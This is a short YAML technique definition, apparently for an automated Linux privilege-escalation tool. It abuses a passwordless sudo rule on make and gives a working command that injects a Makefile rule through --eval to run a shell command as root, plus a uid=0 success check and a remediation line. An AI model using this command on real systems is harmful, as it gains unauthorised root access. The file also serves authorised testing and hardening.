# Sudo → root via make (GTFOBins)
technique: T1548.003
name: Sudo → root via make (GTFOBins)
tactic: [privilege-escalation]
platform: [linux]
ranking:
  exploitability: high
  safety: read-only
  detection: quiet
detect:
  sudo_allows: make
execute:
  command: |-
    sudo make -s --eval=$'x:\n\t-id'
verify:
  success: "uid=0"
cleanup:
  command: ""
report:
  vector_type: gtfobins_sudo
  description: >
    Sudo NOPASSWD on `make` — --eval injects a rule whose recipe shell-execs as root.
  remediation: >
    Drop `make` from sudoers.
  refs: [T1548.003, GTFOBins/make]
